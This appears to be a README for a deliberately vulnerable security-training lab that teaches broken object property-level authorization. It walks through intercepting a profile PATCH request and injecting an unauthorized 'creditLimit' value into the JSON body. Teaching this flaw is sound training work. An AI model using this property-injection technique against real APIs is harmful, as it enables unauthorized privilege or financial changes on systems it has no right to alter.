# BOPLA Clean Lab

A deliberately vulnerable local lab focused on nested object-property
authorization.

## Frontend

Only one profile is shown: Alice.

The UI contains:
- Display name: editable
- Email: editable
- Credit limit: visible but disabled
- Save button
- Hint icon

The frontend does NOT send `creditLimit` during a normal save.

## Expected browser request

```http
PATCH /api/profiles/1001
Authorization: Bearer alice-demo-token
Content-Type: application/json

{
  "profileId": "1001",
  "data": {
    "displayName": "Alice",
    "email": "alice@example.test"
  }
}
```

## BOPLA exercise

Intercept that PATCH request in Burp.

Keep the authentication header and profileId unchanged.

Add a property inside the existing `data` object:

```json
{
  "profileId": "1001",
  "data": {
    "displayName": "Alice",
    "email": "alice@example.test",
    "creditLimit": 999999
  }
}
```

The vulnerable server accepts the property even though the frontend does not
provide a control for it and Alice should not be authorized to modify it.

Then send:

```http
GET /api/profiles/1001
Authorization: Bearer alice-demo-token
```

The server-side credit limit will be changed.

## Why this is BOPLA

Authentication succeeds.
Object authorization succeeds for Alice's profile.
Property-level authorization fails for `creditLimit`.

The vulnerability is therefore the server accepting an unauthorized property
inside an otherwise authorized object update.

## Run

Windows:
```powershell
python server.py
```

Open:
`http://127.0.0.1:8000`

## Render

Build command:
`python --version`

Start command:
`python server.py`

The server binds to `0.0.0.0` and reads `PORT`.

Use only in a controlled security-training environment.
